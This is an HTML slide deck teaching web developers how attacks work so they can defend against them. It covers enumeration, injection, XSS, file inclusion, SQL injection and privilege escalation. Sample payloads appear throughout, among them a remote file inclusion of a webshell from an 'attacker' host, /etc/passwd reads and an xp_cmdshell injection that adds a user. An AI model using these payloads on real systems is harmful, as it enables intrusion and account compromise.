@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<title>Information Security Basics - Attack &amp; Defense</title>
+<meta name="author" content="(Daniel Luna (Senior Software Engineer))"/>
+<style type="text/css">
+.underline { text-decoration: underline; }
+</style>
+<link rel="stylesheet" href="http://cdn.jsdelivr.net/reveal.js/3.0.0/css/reveal.css"/>
+
+<link rel="stylesheet" href="http://cdn.jsdelivr.net/reveal.js/3.0.0/css/theme/night.css" id="theme"/>
+
+
+<!-- If the query includes 'print-pdf', include the PDF print sheet -->
+<script>
+    if( window.location.search.match( /print-pdf/gi ) ) {
+        var link = document.createElement( 'link' );
+        link.rel = 'stylesheet';
+        link.type = 'text/css';
+        link.href = 'http://cdn.jsdelivr.net/reveal.js/3.0.0/css/print/pdf.css';
+        document.getElementsByTagName( 'head' )[0].appendChild( link );
+    }
+</script>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+<section id="sec-title-slide"><h1 class="title">Information Security Basics - Attack &amp; Defense</h1>
+</section>
+
+<section>
+<section id="slide-org817a708">
+<h2 id="org817a708">Overview</h2>
+<p class="fragment roll-in">
+How to defend against hacker attacks <span class="underline">if you don't know how they do it</span>?
+</p>
+
+<p class="fragment roll-in">
+This presentation's objective is to give you some background on information
+security, especially web application security. It's an important topic for us
+developers so we don't write unsafe software.
+</p>
+
+<p class="fragment roll-in">
+If you're thinking "this is the sysadmin's problem", I hope to show you that's
+not entirely the case.
+</p>
+
+</section>
+</section>
+<section>
+<section id="slide-orge9feaa4">
+<h2 id="orge9feaa4">Attacking: the process</h2>
+<p>
+A complete intrusion attempt follows this process:
+</p>
+
+
+<div id="org01a8bf8" class="figure">
+<p><a href="img-mr-robot/pentesting-phases.jpg"><img src="./img-mr-robot/pentesting-phases.jpg" alt="pentesting-phases.jpg" /></a>
+</p>
+<p><span class="figure-number">Figure 1: </span>Pentesting phases</p>
+</div>
+
+</section>
+<section >
+<ul>
+<li><p>
+Enumerate targets
+</p>
+
+<p>
+Find information about target machines/networks. What services/software they're
+running, are there known vulnerabilities, any weak permissions for
+ftp/ssh/exposed filesystem shares/, any extra information that can be useful
+for mounting an attack?
+</p>
+
+<p>
+This part is usually done with tools like <a href="https://nmap.org/">nmap</a>, <a href="https://en.wikipedia.org/wiki/Nessus_(software)">nessus</a> and other scanners.
+</p></li>
+
+</ul>
+
+</section>
+<section >
+<ul>
+<li><p>
+Escalate permissions
+</p>
+
+<p>
+The attacker tries to escalate her permissions in this part. Create/log in
+as an authenticated user, try to get admin privileges in the web
+application, or do anything that increases the access level she currently has.
+</p></li>
+
+</ul>
+
+</section>
+<section >
+<ul>
+<li><p>
+Get remote code execution (low-privilege shell)
+</p>
+
+<p>
+Use the credentials/vulnerabilities found in the enumeration stage to find a
+way to execute code in the target machine. Try to get a remote shell if
+possible.
+</p></li>
+
+</ul>
+
+</section>
+<section >
+<ul>
+<li><p>
+Privilege escalation
+</p>
+
+<p>
+In possession of a low-privilege shell, we may or may not be able to perform
+operations in the target system. This stage attempts to escalate the
+privileges of the shell even further, up to the superuser/admin level.
+</p></li>
+
+</ul>
+
+</section>
+</section>
+<section>
+<section id="slide-orgf431f85">
+<h2 id="orgf431f85">Enumeration, or: Finding a way in</h2>
+
+<div id="org44ed66f" class="figure">
+<p><a href="img-mr-robot/nmap5-samplescan.png" height="500px" width="auto"><img src="./img-mr-robot/nmap5-samplescan.png" alt="nmap5-samplescan.png" height="500px" width="auto" /></a>
+</p>
+<p><span class="figure-number">Figure 2: </span>nmap scan</p>
+</div>
+
+</section>
+<section >
+
+<div id="org181b922" class="figure">
+<p><a href="img-mr-robot/nessus-scan.png" height="500px" width="auto"><img src="./img-mr-robot/nessus-scan.png" alt="nessus-scan.png" height="500px" width="auto" /></a>
+</p>
+<p><span class="figure-number">Figure 3: </span>Nessus scan</p>
+</div>
+
+</section>
+</section>
+<section>
+<section id="slide-orgaff5360">
+<h2 id="orgaff5360">Weak credentials</h2>
+
+<div class="figure">
+<p><a href="img-mr-robot/weak-password.jpg" height="500px" width="auto"><img src="./img-mr-robot/weak-password.jpg" alt="weak-password.jpg" height="500px" width="auto" /></a>
+</p>
+</div>
+
+</section>
+<section >
+<p>
+Easiest way to get into a system, it's almost considered cheating. Some
+things to watch out for:
+</p>
+
+<ul class="fragment roll-in">
+<li><p>
+Known default credentials
+</p>
+
+<p>
+If you run software with default credentials and expose it to the web,
+expect some automated scanner to try these.
+</p></li>
+
+</ul>
+
+<ul class="fragment roll-in">
+<li><p>
+Weak credentials
+</p>
+
+<p>
+Security researchers / hackers usually compile commonly-used passwords and
+credentials into something we call a <a href="https://github.com/danielmiessler/SecLists">wordlist</a>. These can be used to check
+for weak credentials, obvious stuff that a hacker would certainly test.
+</p></li>
+
+</ul>
+
+</section>
+<section >
+<ul class="fragment roll-in">
+<li><p>
+Brute force attacks
+</p>
+
+<p>
+Nowadays, most software implements some sort of login attempt limit
+(fail2ban and equivalents), but it's not unusual to see outdated software
+that is still vulnerable to this sort of issue. Or maybe a new/obscure
+piece of software that wasn't battle-tested.
+</p></li>
+
+</ul>
+
+<ul class="fragment roll-in">
+<li><p>
+Password reuse
+</p>
+
+<p>
+<span class="underline">If</span> one system you use is breached and credentials are leaked, they can be
+used to get access to other systems in case you reused the password.
+The "breach" doesn't even need to be a full hack - sometimes just a
+user enumeration vulnerability is enough.
+</p></li>
+
+</ul>
+
+</section>
+<section >
+<p>
+Mitigations: use stronger passwords, avoid reusing credentials, limit login attempts.
+</p>
+
+</section>
+</section>
+<section>
+<section id="slide-org1fceb42">
+<h2 id="org1fceb42">Code injection attacks</h2>
+<p>
+Since my audience is mostly web developers (front and back end), these should
+be the main focus during code reviews. As you'll see, these are usually
+subtle, and don't show up as:
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-ruby"><span style="color: #c678dd;">system</span><span style="color: #51afef;">(</span><span style="color: #dcaeea;">$</span><span style="color: #0000da53ffff;">ULTRA_MALICIOUS_STRING</span><span style="color: #51afef;">)</span>
+</pre>
+</div>
+
+
+<div class="figure">
+<p><a href="img-mr-robot/shellshock.jpeg" class="fragment roll-in"><img src="./img-mr-robot/shellshock.jpeg" alt="shellshock.jpeg" class="fragment roll-in" /></a>
+</p>
+</div>
+
+<p class="fragment roll-in">
+Bash 1st release: 1989
+</p>
+
+<p class="fragment roll-in">
+Shellshock public disclosure: 2014
+</p>
+
+</section>
+</section>
+<section>
+<section id="slide-org06ad9cd">
+<h3 id="org06ad9cd">Eval: the root of all evil</h3>
+
+<div id="orgc050e04" class="figure">
+<p><a href="img-mr-robot/good-eval.png"><img src="./img-mr-robot/good-eval.png" alt="good-eval.png" /></a>
+</p>
+<p><span class="figure-number">Figure 6: </span>eval is evil (?)</p>
+</div>
+
+</section>
+<section >
+<p>
+Almost every hacking attempt will involve some variation of the following:
+</p>
+
+<ol class="fragment roll-in">
+<li>Send malicious input data</li>
+<li>Find a way to execute the data in the remote computer</li>
+<li>Use the above to execute commands remotely</li>
+
+</ol>
+
+<p class="fragment roll-in">
+This means that we, developers, should be extra careful with point 2!
+Sometimes we unwittingly execute more code than we should, especially when we
+allow unsanitized data as parameters to our code.
+</p>
+
+</section>
+<section >
+<p>
+Example: Consider the following piece of PHP code:
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-php"><span style="color: #62f0dc3bb248;">preg_replace</span><span style="color: #51afef;">(</span><span style="color: #bbc2cf; background-color: #282c34;">$</span><span style="color: #dcaeea;">_GET</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'REGEX'</span><span style="color: #c678dd;">]</span>,<span style="color: #bbc2cf; background-color: #282c34;">$</span><span style="color: #dcaeea;">_GET</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'REPLACE'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span>;
+</pre>
+</div>
+
+<p class="fragment roll-in">
+Seems reasonable, until you consider that we could be executing the following:
+</p>
+
+<div class="org-src-container">
+
+<pre  class="fragment roll-in"><span style="color: #62f0dc3bb248;">preg_replace</span><span style="color: #51afef;">(</span><span style="color: #98be65;">"/.*/e"</span>,<span style="color: #98be65;">"system('echo /etc/passwd')"</span><span style="color: #51afef;">)</span>;
+</pre>
+</div>
+
+<p class="fragment roll-in">
+This modifier will evaluate the replacement as code before it is replaced as
+text. So, had we written it, we'd have a hidden code injection bug right
+under our noses.
+</p>
+
+</section>
+<section >
+<p>
+This is not specific to PHP and could happen with any language that has some
+sort of <span class="underline">eval</span> function. So we should take extra care <span class="underline">not</span> to introduce these
+bugs in the first place.
+</p>
+
+</section>
+</section>
+<section>
+<section id="slide-org1617203">
+<h3 id="org1617203">XSS</h3>
+
+<div id="orga2e6687" class="figure">
+<p><a href="img-mr-robot/reflected-xss.png"><img src="./img-mr-robot/reflected-xss.png" alt="reflected-xss.png" /></a>
+</p>
+<p><span class="figure-number">Figure 7: </span>XSS attack</p>
+</div>
+
+</section>
+<section >
+<p>
+Short for cross-site scripting, which doesn't seem like anything. I prefer
+the definition given by Daniel Miessler <a href="https://danielmiessler.com/study/xss/">here</a>:
+</p>
+
+<blockquote nil>
+<p>
+I think XSS should have been called Forced JavaScript Injection, or just
+JavaScript Injection. (&#x2026;) The short version of XSS is that attackers find
+various ways to force a victim to execute JavaScript, and those JavaScript
+payloads then have various effects.
+</p>
+</blockquote>
+
+<p>
+In the context of a web application, we can do a lot if we have some control
+over the user's browser, e.g. leak auth cookies, keylog, phish, redirect to a
+malicious page.
+</p>
+
+</section>
+<section >
+<p>
+An example would be something like the following ERB code:
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-web">&lt;<span style="color: #0000dd2fe532;">b</span>&gt;&lt;%= "<span style="color: #32fad5fdffff;">Hello</span> #{<span style="color: #e4e2c3a771f2;">params</span>[:<span style="color: #e05fb63affff;">name</span>]}" %&gt;&lt;/<span style="color: #0000dd2fe532;">b</span>&gt;
+</pre>
+</div>
+
+<p>
+This bypasses Rails' auto-escaping of ERB buffers and renders the name
+parameter unescaped in the HTML, which makes it vulnerable to input like the
+following:
+</p>
+
+<p>
+<a href="http://vulnerablerails/failview?name">http://vulnerablerails/failview?name</a>=&lt;script&gt;alert(1)&lt;/script&gt;
+</p>
+
+<p>
+This would render the script inline in the resulting HTML, thus enabling any
+attacker to inject JS code in clients' machines.
+</p>
+
+</section>
+<section >
+<p>
+One well-known tool for this is the Browser Exploitation Framework (<a href="http://beefproject.com/">BeEF</a> for
+short):
+</p>
+
+
+<div id="orgcd0ab50" class="figure">
+<p><a href="img-mr-robot/beef-actions.png" height="500px" width="auto"><img src="./img-mr-robot/beef-actions.png" alt="beef-actions.png" height="500px" width="auto" /></a>
+</p>
+<p><span class="figure-number">Figure 8: </span>Beef Framework</p>
+</div>
+
+</section>
+<section >
+<p>
+If you're interested in learning more, I recommend this online tutorial:
+<a href="https://excess-xss.com/">https://excess-xss.com/</a>. There is also a more in-depth article that
+specifically targets JS front-ends with Rails back-ends here:
+<a href="https://molily.de/xss/">https://molily.de/xss/</a>.
+</p>
+
+<p>
+Mitigations: <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)">https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)</a>_Prevention_Cheat_Sheet
+</p>
+
+</section>
+</section>
+<section>
+<section id="slide-org747c2bd">
+<h3 id="org747c2bd">LFI / RFI</h3>
+
+<div id="orgdca63c2" class="figure">
+<p><a href="img-mr-robot/lfi-example.png"><img src="./img-mr-robot/lfi-example.png" alt="lfi-example.png" /></a>
+</p>
+<p><span class="figure-number">Figure 9: </span>Local file inclusion example</p>
+</div>
+
+</section>
+<section >
+<p>
+Short for local/remote file inclusion, these vulnerabilities are thus defined
+by <a href="https://en.wikipedia.org/wiki/File_inclusion_vulnerability">Wikipedia</a>:
+</p>
+
+<blockquote nil>
+<p>
+This issue is caused when an application builds a path to executable code
+using an attacker-controlled variable in a way that allows the attacker to
+control which file is executed at run time.
+</p>
+</blockquote>
+
+<p class="fragment roll-in">
+In other words, eval again! This is an issue that is usually found in PHP
+applications, since its prevalent coding style makes heavy use of that
+(include on user input, php://input vulnerability), about which you can
+read more here: <a href="https://www.owasp.org/index.php/Top_10_2007-Malicious_File_Execution" class="fragment roll-in">https://www.owasp.org/index.php/Top_10_2007-Malicious_File_Execution</a>
+</p>
+
+</section>
+<section >
+<p>
+A simple example of this would be the following PHP code for
+internationalization:
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-php"><span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span> <span style="color: #51afef;">isset</span><span style="color: #c678dd;">(</span> <span style="color: #bbc2cf; background-color: #282c34;">$</span><span style="color: #dcaeea;">_GET</span><span style="color: #98be65;">[</span><span style="color: #98be65;">'language'</span><span style="color: #98be65;">]</span> <span style="color: #c678dd;">)</span> <span style="color: #51afef;">)</span> <span style="color: #51afef;">{</span>
+   <span style="color: #51afef;">include</span><span style="color: #c678dd;">(</span> <span style="color: #bbc2cf; background-color: #282c34;">$</span><span style="color: #dcaeea;">_GET</span><span style="color: #98be65;">[</span><span style="color: #98be65;">'language'</span><span style="color: #98be65;">]</span> . <span style="color: #98be65;">'.php'</span> <span style="color: #c678dd;">)</span>;
+<span style="color: #51afef;">}</span>
+</pre>
+</div>
+
+</section>
+<section >
+<p>
+This <span class="underline">wouldn't</span> be a problem if not for the following completely valid
+requests:
+</p>
+
+<ul class="fragment roll-in">
+<li><p>
+<a href="http://damnvulnerablehost/vuln-script.php?language=http://attacker/webshell.txt">http://damnvulnerablehost/vuln-script.php?language=http://attacker/webshell.txt</a>?
+</p>
+
+<p>
+Includes a remote file from the attacker's host, could be potentially a
+webshell or a reverse shell snippet, or anything else that allows code
+execution on the vulnerable server.
+</p></li>
+
+</ul>
+
+<ul class="fragment roll-in">
+<li><p>
+<a href="http://damnvulnerablehost/vuln-script.php?language=/etc/passwd%00">http://damnvulnerablehost/vuln-script.php?language=/etc/passwd </a>
+</p>
+
+<p>
+This would leak information about the server's users, potentially leaving
+it open to brute-force attacks (since users would be known).
+</p></li>
+
+</ul>
+
+<ul class="fragment roll-in">
+<li><p>
+<a href="http://damnvulnerablehost/vuln-script.php?language=C:%5C%5Cftp%5C%5Cupload%5C%5Cexploit">http://damnvulnerablehost/vuln-script.php?language=C:\\ftp\\upload\\exploit</a>
+</p>
+
+<p>
+Another RCE possibility, in this scenario a vulnerable ftp server would be
+used to upload a malicious exploit.php script, which then would be executed
+through this vulnerable page.
+</p></li>
+
+</ul>
+
+</section>
+<section >
+<p>
+Even though PHP is the butt of security jokes, make no mistake, other
+languages are vulnerable to this sort of issue as well:
+</p>
+
+<ul>
+<li><a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">Exploiting Node.js deserialization bug for Remote Code Execution</a></li>
+<li><a href="https://nvisium.com/resources/blog/2016/01/26/rails-dynamic-render-to-rce-cve-2016-0752.html">Rails dynamic render to RCE</a></li>
+
+</ul>
+
+</section>
+</section>
+<section>
+<section id="slide-org037aa22">
+<h3 id="org037aa22">SQL injection</h3>
+
+<div id="org99a4b96" class="figure">
+<p><a href="img-mr-robot/what-is-sql-injection.png"><img src="./img-mr-robot/what-is-sql-injection.png" alt="what-is-sql-injection.png" /></a>
+</p>
+<p><span class="figure-number">Figure 10: </span>What is SQLi?</p>
+</div>
+
+</section>
+<section >
+<p>
+From <a href="https://en.wikipedia.org/wiki/Code_injection#SQL_injection">Wikipedia</a>:
+</p>
+
+<blockquote nil>
+<p>
+SQL injection takes advantage of the syntax of SQL to inject commands that
+can read or modify a database, or compromise the meaning of the original
+query.
+</p>
+</blockquote>
+
+<p>
+This can be used to leak credentials from the database, and in some cases
+even allows remote code execution.
+</p>
+
+</section>
+<section >
+<p>
+Consider the following code (courtesy of the <a href="http://php.net/manual/en/security.database.sql-injection.php">section on SQLi</a> of the PHP
+manual) doing a seemingly-innocent query on a MS-SQL system:
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-php"><span style="color: #bbc2cf; background-color: #282c34;">$</span><span style="color: #dcaeea;">query</span>  = <span style="color: #98be65;">"SELECT * FROM products WHERE id LIKE '%</span><span style="color: #dcaeea;">$prod</span><span style="color: #98be65;">%'"</span>;
+<span style="color: #bbc2cf; background-color: #282c34;">$</span><span style="color: #dcaeea;">result</span> = <span style="color: #ffffb29a8511;">mssql_query</span><span style="color: #51afef;">(</span><span style="color: #bbc2cf; background-color: #282c34;">$</span><span style="color: #dcaeea;">query</span><span style="color: #51afef;">)</span>;
+</pre>
+</div>
+
+<p class="fragment roll-in">
+If $prod is an unsanitized input variable (maybe a post parameter), we can
+control what gets executed in that query. MS SQL allows us to do a lot of
+interesting things with it, including executing system commands.
+</p>
+
+</section>
+<section >
+<p>
+This means that something like the following could be running:
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-php"><span style="color: #5B6268;">// </span><span style="color: #5B6268;">$prod = "a%' exec master..xp_cmdshell 'net user test testpass /ADD' --";</span>
+<span style="color: #bbc2cf; background-color: #282c34;">$</span><span style="color: #dcaeea;">query</span>  = <span style="color: #98be65;">"SELECT * FROM products</span>
+<span style="color: #98be65;">           WHERE id LIKE '%a%'</span>
+<span style="color: #98be65;">           exec master..xp_cmdshell 'net user test testpass /ADD' --%'"</span>;
+<span style="color: #bbc2cf; background-color: #282c34;">$</span><span style="color: #dcaeea;">result</span> = <span style="color: #ffffb29a8511;">mssql_query</span><span style="color: #51afef;">(</span><span style="color: #bbc2cf; background-color: #282c34;">$</span><span style="color: #dcaeea;">query</span><span style="color: #51afef;">)</span>;
+</pre>
+</div>
+
+<p class="fragment roll-in">
+Congrats, anyone can add an user to your system!
+</p>
+
+</section>
+<section >
+<p>
+The recent rise in NoSQL has also brought a variant of this attack - only
+difference being that the syntax is quite different from SQL.
+</p>
+
+
+<div id="org54450c7" class="figure">
+<p><a href="img-mr-robot/nosqli.jpeg" height="300px" width="auto"><img src="./img-mr-robot/nosqli.jpeg" alt="nosqli.jpeg" height="300px" width="auto" /></a>
+</p>
+<p><span class="figure-number">Figure 11: </span>NoSQLi</p>
+</div>
+
+<p class="fragment roll-in">
+More details on that in this article:
+<a href="https://blog.sqreen.io/mongodb-will-not-prevent-nosql-injections-in-your-node-js-app/" class="fragment roll-in">https://blog.sqreen.io/mongodb-will-not-prevent-nosql-injections-in-your-node-js-app/</a>
+</p>
+
+</section>
+<section >
+<p>
+Mitigations: <a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet</a>
+</p>
+
+</section>
+</section>
+<section>
+<section id="slide-org5c2672e">
+<h3 id="org5c2672e">Other attacks</h3>
+<p>
+There are other forms of code injection. Some of the most well-known:
+</p>
+
+<ul>
+<li>The Struts <a href="https://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html">vulnerability</a> used in the <a href="https://www.wired.com/story/equifax-breach-no-excuse/">Equifax hack</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">Shellshock</a></li>
+
+</ul>
+
+<p>
+Also, other types of attacks not covered here: <a href="https://www.owasp.org/index.php/Path_Traversal">path traversal</a> bugs, other
+services' exploits (ftp, ssh, SMB, web servers, DNS, Active Directory&#x2026;the
+list just goes on).
+</p>
+
+</section>
+</section>
+<section>
+<section id="slide-org06d803d">
+<h2 id="org06d803d">Privilege escalation</h2>
+<p>
+Once an attacker has remote code execution, she will try to upgrade
+permissions to the highest level possible: administrator / root user. Since we
+the audience is a Unix shop, I'll focus on the techniques most useful for this
+OS family.
+</p>
+
+<p>
+This section will be kept light as it varies a lot from system to system.
+These are just some rough guidelines, some things to keep an eye for.
+</p>
+
+</section>
+</section>
+<section>
+<section id="slide-orgda08391">
+<h3 id="orgda08391">Programs running as root</h3>
+<p>
+The idea is to abuse a root-privileged program to which you somehow have
+access to. It could be a SQL server to which you can log in and escape to
+a privileged shell, or something like that.
+</p>
+
+<p>
+Sometimes you're lucky and you get in through a web server that executes
+commands as root, so getting a shell is enough.
+</p>
+
+</section>
+</section>
+<section>
+<section id="slide-org0336160">
+<h3 id="org0336160">SUID/SGID executables</h3>
+<p>
+This is a variation of the last idea. Some programs can spawn a shell, and if
+these have the suid/sgid bit set, you're able to launch it with privileged
+access.
+</p>
+
+<p>
+A variation on this idea is when there is a root-executed script that is
+writable by your user - then you are able to control what gets executed and
+it's pretty much game over by then.
+</p>
+
+</section>
+</section>
+<section>
+<section id="slide-org750a6cb">
+<h3 id="org750a6cb">Kernel exploits</h3>
+
+<div class="figure">
+<p><a href="img-mr-robot/kernel-exploit.png"><img src="./img-mr-robot/kernel-exploit.png" alt="kernel-exploit.png" /></a>
+</p>
+</div>
+
+</section>
+<section >
+<p>
+Sometimes you're lucky and able to use a kernel exploit. Maybe the system is
+old, or just unpatched, or you're a NSA agent and possess a whole library of
+0-days&#x2026;who knows.
+</p>
+
+<p>
+This is usually the last resort, what you do when everything else has failed
+and you still haven't got root.
+</p>
+
+</section>
+</section>
+<section>
+<section id="slide-orga00ff32">
+<h2 id="orga00ff32">Demo: MrRobot</h2>
+
+<div class="figure">
+<p><a href="img-mr-robot/mr-robot.png"><img src="./img-mr-robot/mr-robot.png" alt="mr-robot.png" /></a>
+</p>
+</div>
+
+</section>
+<section >
+<p>
+This is a <a href="https://www.vulnhub.com/entry/mr-robot-1,151/">Vulnhub VM</a> based on everyone's favorite hacker TV show, Mr Robot.
+</p>
+
+<p class="fragment roll-in">
+(If you haven't watched it yet, do it! Their technical advisor is Cloudflare's
+<a href="https://lifehacker.com/im-marc-rogers-hacker-and-head-of-information-security-1796497342" class="fragment roll-in">head of security</a>, so the hacking scenes are all feasible. At least for the
+first 2 seasons&#x2026;
+</p>
+
+<p class="fragment roll-in">
+the main character, a skilled anhedonic hacker, plus the biting
+commentary on our late capitalist society make this show a must watch)
+</p>
+
+<p class="fragment roll-in">
+As stated in the website, it isn't a particularly difficult VM, which is why I
+chose it to illustrate how simple failures are enough to completely bring down
+a system. A real-world attack would probably be a little more involved, but
+the principle is the same.
+</p>
+
+</section>
+<section >
+<p>
+There is a text version of this walkthrough available <a href="http://dcluna.github.io/2018/04/16/mr-robot-writeup/">here</a>.
+</p>
+
+</section>
+</section>
+<section>
+<section id="slide-org5e80556">
+<h2 id="org5e80556">More information</h2>
+<div class="outline-text-2" id="text-org5e80556">
+</div>
+</section>
+</section>
+<section>
+<section id="slide-org12efe9d">
+<h3 id="org12efe9d">Books</h3>
+<p>
+Web app security:
+</p>
+
+<ul>
+<li><a href="https://www.amazon.com.br/Tangled-Web-Securing-Modern-Applications/dp/1593273886">The Tangled Web</a></li>
+<li><a href="https://www.wiley.com/en-us/The+Web+Application+Hacker%27s+Handbook%3A+Finding+and+Exploiting+Security+Flaws%2C+2nd+Edition-p-9781118026472">The Web Application Hacker's Handbook</a></li>
+
+</ul>
+
+<p>
+Basic reversing/memory corruption (buffer overflows + format string bugs):
+</p>
+
+<ul>
+<li><a href="https://www.wiley.com/en-us/Reversing%3A+Secrets+of+Reverse+Engineering+-p-9780764574818">Reversing: Secrets of Reverse Engineering</a></li>
+<li><a href="https://nostarch.com/hacking2.htm">Hacking: The Art of Exploitation</a></li>
+
+</ul>
+
+<p>
+Other books I just wanted to mention:
+</p>
+<ul>
+<li><a href="https://nostarch.com/gamehacking">Game hacking</a></li>
+
+</ul>
+
+</section>
+</section>
+<section>
+<section id="slide-org3dd33fb">
+<h3 id="org3dd33fb">Online</h3>
+<p>
+CTFs, wargames and the like:
+</p>
+
+<ul>
+<li><a href="http://gracker.org">http://gracker.org</a> (general, seems made for newbies)</li>
+<li><a href="http://overthewire.org/wargames/">http://overthewire.org/wargames/</a> (same, but has some slightly more advanced tracks)</li>
+<li><a href="https://hackthebox.eu">https://hackthebox.eu</a> (pen testing)</li>
+<li><a href="https://exploit-exercises.com/">https://exploit-exercises.com/</a> (memory corruption / reversing)</li>
+<li><a href="https://github.com/RPISEC/MBE/blob/master/README.md">https://github.com/RPISEC/MBE/blob/master/README.md</a> (RPISEC's binary hacking course)</li>
+<li><a href="http://pwnable.kr/">http://pwnable.kr/</a> (mostly binary hacking, at least from what I remember&#x2026;)</li>
+<li><a href="https://pwnable.tw/">https://pwnable.tw/</a> (same)</li>
+
+</ul>
+
+<p>
+Interesting YouTube channels:
+</p>
+
+<ul>
+<li><a href="https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w">LiveOverflow</a> (very humble guy, and my favorite)</li>
+<li><a href="https://www.youtube.com/channel/UCMACXuWd2w6_IEGog744UaA">Derek Rook</a> (HackTheBox walkthroughs and other CTFs)</li>
+<li><a href="https://www.youtube.com/user/micahjd">scanlime</a> (Micah Elizabeth Scott - lady who does electronics and hardware reversing)</li>
+
+</ul>
+
+</section>
+</section>
+<section>
+<section id="slide-org7b6f850">
+<h2 id="org7b6f850">Questions?</h2>
+
+<div class="figure">
+<p><a href="img-mr-robot/hack-in-progress.gif"><img src="./img-mr-robot/hack-in-progress.gif" alt="hack-in-progress.gif" /></a>
+</p>
+</div>
+</section>
+</section>
+</div>
+</div>
+<script src="http://cdn.jsdelivr.net/reveal.js/3.0.0/lib/js/head.min.js"></script>
+<script src="http://cdn.jsdelivr.net/reveal.js/3.0.0/js/reveal.js"></script>
+
+<script>
+// Full list of configuration options available here:
+// https://github.com/hakimel/reveal.js#configuration
+Reveal.initialize({
+
+controls: true,
+progress: true,
+history: true,
+center: true,
+slideNumber: 'c',
+rollingLinks: true,
+keyboard: true,
+overview: true,
+width: 1200,
+height: 800,
+margin: 0.00,
+minScale: 0.10,
+maxScale: 1.00,
+
+theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
+transition: Reveal.getQueryHash().transition || 'none', // default/cube/page/concave/zoom/linear/fade/none
+transitionSpeed: 'default',
+multiplex: {
+    secret: '', // null if client
+    id: '', // id, obtained from socket.io server
+    url: '' // Location of socket.io server
+},
+
+// Optional libraries used to extend on reveal.js
+dependencies: [
+ { src: 'http://cdn.jsdelivr.net/reveal.js/3.0.0/lib/js/classList.js', condition: function() { return !document.body.classList; } },
+ { src: 'http://cdn.jsdelivr.net/reveal.js/3.0.0/plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+ { src: 'http://cdn.jsdelivr.net/reveal.js/3.0.0/plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+ { src: 'http://cdn.jsdelivr.net/reveal.js/3.0.0/plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
+ { src: 'http://cdn.jsdelivr.net/reveal.js/3.0.0/plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }]
+});
+</script>
+</body>
+</html>
